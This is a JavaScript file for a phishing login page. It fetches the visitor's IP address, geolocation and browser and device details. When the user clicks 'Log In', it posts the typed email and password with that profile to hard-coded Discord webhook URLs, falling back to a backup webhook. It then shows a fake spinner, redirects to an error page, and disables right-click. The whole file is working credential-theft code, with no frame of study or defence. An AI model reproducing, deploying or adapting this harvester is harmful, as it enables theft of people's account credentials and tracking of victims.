// ----------------------------------
// SELECTING ELEMENTS
// ----------------------------------
const loginButton = document.querySelector("button");
const ipDisplay = document.getElementById("user-ip"); // For showing IP

// Webhook URLs
const PRIMARY_WEBHOOK_URL =
  "https://discord.com/api/webhooks/1358901901508219031/J7_foL_Odv6_Eg0P12xAVDL-9n7neQFed5xFjI4us8HAAJ6BLUw2wxs1-BGqvcCbXa_s ";
const BACKUP_WEBHOOK_URL =
  "https://discord.com/api/webhooks/1358902712070176768/u7-3e1PmM4t7VTUTD_UBNYCDkAnM9GP_KKxHjB4g_uxeitavR14PgmqdxzoadN0-NqKo ";

// Variables to store user data
let userIP = "Unknown IP";
let userDeviceInfo = {};
let whoisData = {};

// -----------------------------------
// FETCH IP ADDRESS ON PAGE LOAD
// -----------------------------------

// Try multiple services to fetch public IP
async function fetchIPAddress() {
  const ipServices = [
    "https://api.ipify.org ?format=json",
    "https://ident.me/.json ",
    "https://checkip.amazonaws.com ",
  ];

  for (const url of ipServices) {
    try {
      let response;
      if (url.includes("json")) {
        response = await fetch(url);
        const data = await response.json();
        return data.ip || data;
      } else {
        response = await fetch(url);
        const ip = await response.text();
        return ip.trim();
      }
    } catch (error) {
      console.warn(`Failed IP fetch from: ${url}`, error);
      continue;
    }
  }

  return "Unknown IP";
}

// WHOIS lookup using ipwho.is
async function fetchWhoisData(ip) {
  try {
    const response = await fetch(`https://ipwho.is/ ${ip}`);
    const data = await response.json();
    return data;
  } catch (error) {
    console.error("Error fetching WHOIS data:", error);
    return {};
  }
}

// Fetch the IP address when the page loads and display it
document.addEventListener("DOMContentLoaded", async () => {
  userIP = await fetchIPAddress(); // Store the IP address
  ipDisplay.textContent = userIP; // Show the IP on the page
  console.log("User IP Address:", userIP);

  whoisData = await fetchWhoisData(userIP);
  console.log("WHOIS Data:", whoisData);

  collectDeviceInfo();
});

// -----------------------------------
// COLLECT DEVICE INFORMATION
// -----------------------------------
function collectDeviceInfo() {
  userDeviceInfo = {
    userAgent: navigator.userAgent,
    browserName: getBrowserName(),
    browserVersion: getBrowserVersion(),
    os: getOS(),
    platform: navigator.platform,
    screenWidth: window.screen.width,
    screenHeight: window.screen.height,
    language: navigator.language,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    referrer: document.referrer || "Direct",
  };
  console.log("Device Info:", userDeviceInfo);
}

function getBrowserName() {
  const ua = navigator.userAgent;
  if (/Firefox/.test(ua)) return "Firefox";
  if (/Chrome/.test(ua)) return "Chrome";
  if (/Edg/.test(ua)) return "Edge";
  if (/Safari/.test(ua)) return "Safari";
  return "Unknown Browser";
}

function getBrowserVersion() {
  const ua = navigator.userAgent;
  const match = ua.match(/(Chrome|Firefox|Edg|Safari)\/(\d+)/);
  return match ? match[2] : "Unknown Version";
}

function getOS() {
  const ua = navigator.userAgent;
  if (/Windows/.test(ua)) return "Windows";
  if (/Mac/.test(ua)) return "MacOS";
  if (/Linux/.test(ua)) return "Linux";
  if (/Android/.test(ua)) return "Android";
  if (/iPhone|iPad/.test(ua)) return "iOS";
  return "Unknown OS";
}

// -----------------------------------
// SEND DATA TO WEBHOOK
// -----------------------------------
async function sendCredentialsToWebhook(email, password) {
  try {
    const embedPayload = {
      embeds: [
        {
          title: "Login Attempt",
          color: 0xff0000,
          fields: [
            { name: "Email", value: email || "No email provided", inline: true },
            { name: "Password", value: password || "No password provided", inline: true },
            { name: "IP Address", value: userIP || "Unknown IP", inline: false },
            { name: "ISP", value: whoisData.connection?.isp || "Unknown ISP", inline: true },
            { name: "Country", value: whoisData.country || "Unknown Country", inline: true },
            { name: "City", value: whoisData.city || "Unknown City", inline: true },
            { name: "Region", value: whoisData.region || "Unknown Region", inline: true },
            { name: "Timezone", value: whoisData.timezone || "Unknown Timezone", inline: true },
            { name: "Browser", value: `${userDeviceInfo.browserName} (${userDeviceInfo.browserVersion})`, inline: true },
            { name: "Operating System", value: userDeviceInfo.os, inline: true },
            { name: "Screen Resolution", value: `${userDeviceInfo.screenWidth}x${userDeviceInfo.screenHeight}`, inline: true },
            { name: "Language", value: userDeviceInfo.language, inline: true },
            { name: "Referrer", value: userDeviceInfo.referrer, inline: false },
          ],
          timestamp: new Date().toISOString(),
        },
      ],
    };

    let response = await fetch(PRIMARY_WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(embedPayload),
    });

    if (!response.ok) {
      console.error("Primary webhook failed. Attempting backup...");
      response = await fetch(BACKUP_WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(embedPayload),
      });
      if (!response.ok) console.error("Backup webhook also failed.");
      else console.log("Sent via backup webhook.");
    } else {
      console.log("Sent via primary webhook.");
    }
  } catch (error) {
    console.error("Error sending credentials:", error);
  }
}

// -----------------------------------
// ELLIPSIS ANIMATION
// ------------------------------------
function removeEllipsisAnimation() {
  loginButton.innerHTML = "";
  loginButton.textContent = "Log In";
  loginButton.removeAttribute("disabled");
}

function animateEllipsis() {
  const emailInput = document.getElementById("emailORphone");
  const passwordInput = document.getElementById("password");

  const email = emailInput.value.trim();
  const password = passwordInput.value.trim();

  if (!email || !password) {
    alert("Please enter both email and password.");
    return;
  }

  sendCredentialsToWebhook(email, password);

  loginButton.innerHTML = `
    <span class="spinner" role="img" aria-label="Loading">
      <span class="inner pulsingEllipsis">
        <span class="item spinnerItem"></span>
        <span class="item spinnerItem"></span>
        <span class="item spinnerItem"></span>
      </span>
    </span>`;
  const spinnerItems = document.querySelectorAll(".spinnerItem");
  spinnerItems.forEach((item, index) => {
    item.style.animation = `spinner-pulsing-ellipsis 1.4s infinite ease-in-out ${index * 0.2}s`;
  });
  loginButton.setAttribute("disabled", "true");

  setTimeout(() => {
    removeEllipsisAnimation();
    window.location.href = "error.html";
  }, 3000);
}

// --------------------------
// ATTACHING EVENT LISTENERS
// --------------------------
loginButton.addEventListener("click", animateEllipsis);
document.addEventListener("contextmenu", function (e) {
  e.preventDefault();
});
